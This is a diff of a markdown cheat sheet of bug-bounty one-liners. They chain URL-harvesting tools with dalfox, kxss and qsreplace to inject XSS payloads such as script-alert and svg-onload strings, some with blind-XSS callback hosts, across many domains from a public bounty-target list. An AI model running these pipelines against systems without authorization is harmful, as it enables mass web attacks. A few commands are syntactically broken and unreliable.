@@ -1,11 +1,11 @@
 # loops and one liners for bug bounty 
-Credits goes to all those awesome researchers who uploaded these on Twitter
+Credits goes to all those awesome researchers who uploaded these on Twitter and their GitHub  
 
 
 
 ## One Liners for XSS
 
-### You can also use DALFOX to send the result for xss
+### Using DALFOX to send the result for xss
 
 ```bash
 cat target_list| gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind https://yours.xss.ht -o result.txt
@@ -18,26 +18,35 @@ waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script
 
 ```
 
-### To find XSS using DALFOX using go spider
+### Using Gospider with Dalfox to find XSS
 
 ```bash
 gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o output.txt
 ```
 
-### Scan domains and subdomains from Bounty Targets data Using DalFox for XSS
+### Scan subdomains from Bounty Targets data Using DalFox for XSS
 
 ```bash
-wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; | subfinder -dL domains.txt | httpx -silent -threads 500 | xargs -I@ dalfox url @
-
+wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; | subfinder -dL domains.txt | httpx -silent -threads 500 | tee -a subdomains.txt | dalfox file subdomains.txt -b your.xss.ht pipe
 
 ```
+### Using Kxss for finding xss issues
 
+```bash
+cat http://subdomains.txt | waybackurls | kxss
+```
 
+### Using Gospider with qsReplace
 
-
-
+```bash
+gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg/onload=confirm(1);>'
+```
 
 ************************************************************************************************************************************
+
+
+## For AssetDiscovery with subdomains, 
+
 
 ### Brute Force List of subdomains using FFuf
 
